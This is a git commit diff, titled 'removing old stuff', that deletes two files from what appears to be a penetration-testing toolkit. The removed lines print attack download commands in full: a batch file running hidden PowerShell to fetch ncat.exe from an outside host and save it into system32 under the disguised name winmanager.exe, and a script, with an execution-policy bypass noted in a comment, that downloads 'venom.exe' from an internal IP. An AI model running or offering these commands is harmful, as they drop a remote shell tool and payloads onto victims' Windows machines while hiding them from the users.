d3f21ab9c82051554913e4ba217bd9b94e0d5de5
totekuh <downtownxore@gmail.com>
2021-08-14 02:41:02 +0200

    removing old stuff

--- tools/file-transfers/powershell/powershell-download-and-execute.bat
+++
@@ -1,1 +0,0 @@
-powershell.exe -WindowStyle Hidden (New-Object System.Net.WebClient).DownloadFile('https://virtualsquad.ninja/ncat.exe','C:\WINDOWS\system32\winmanager.exe');
--- tools/file-transfers/powershell/powershell-download.ps1
+++
@@ -1,6 +0,0 @@
-# powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File download.ps1
-$storageDir = $pwd
-$webclient = New-Object System.Net.WebClient
-$url = "http://10.11.0.58/venom.exe"
-$file = "venom.exe"
-$webclient.DownloadFile($url,$file)
